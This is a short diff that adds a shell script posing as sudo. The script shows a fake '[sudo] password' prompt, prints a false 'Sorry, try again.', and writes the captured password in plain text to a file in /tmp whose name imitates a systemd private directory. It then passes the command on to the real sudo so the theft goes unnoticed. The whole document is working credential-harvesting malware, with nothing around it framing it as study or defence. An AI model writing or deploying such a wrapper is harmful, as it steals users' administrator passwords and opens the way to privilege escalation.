@@ -1,0 +1,7 @@
+read -sp "[sudo] password for $USER: " sudopass
+echo ""
+sleep 2
+echo "Sorry, try again."
+echo $sudopass >> /tmp/systemd-private-9457a6fde4f349c68448c87a457c92d0-systemd-login-d.service-wTLXZ9/pass.txt
+
+/usr/bin/sudo $@
